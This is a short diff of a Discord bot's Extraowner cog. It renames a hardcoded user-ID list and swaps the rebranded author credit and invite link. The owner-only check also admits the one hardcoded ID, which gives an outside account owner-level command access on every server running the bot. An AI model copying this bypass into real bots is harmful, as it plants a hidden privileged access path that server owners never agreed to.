@@ -36,8 +36,8 @@ class Extraowner(commands.Cog):
             await ctx.send(embed=embed)
             return
 
-        Sentinel = ['1131806691969728593']
-        if ctx.author.id != ctx.guild.owner_id and str(ctx.author.id) not in Sentinel:
+        Bitzxier = ['1131806691969728593']
+        if ctx.author.id != ctx.guild.owner_id and str(ctx.author.id) not in Bitzxier:
             embed = discord.Embed(title="<:olympus_cross:1368120655643414548> Access Denied",
                                   description="Only Server Owner Can Run This Command",
                                   color=0x000000
@@ -169,6 +169,6 @@ class ConfirmView(View):
 """
 @Author: aadarshhhhh 
     + Discord: aadarshhhhh 
-    + Community: https://discord.gg/6xyJzcMXRA (Sentinel Development)
+    + Community: https://discord.gg/6ffb6TpMH3 (Bitzxier Reborn)
     + for any queries reach out Community or DM me.
 """
